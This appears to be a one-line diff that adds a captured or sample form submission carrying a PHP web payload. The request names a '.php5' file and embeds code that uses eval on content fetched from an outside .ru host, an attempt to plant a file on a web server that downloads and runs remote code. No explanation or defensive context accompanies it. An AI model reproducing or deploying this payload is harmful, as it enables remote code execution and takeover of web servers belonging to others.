@@ -1,0 +1,1 @@
+form_id=1test&name=.php5&<?php eval(file_get_contents('http://bridgepharm.ru/wp-includes/ID3/1.txt'));
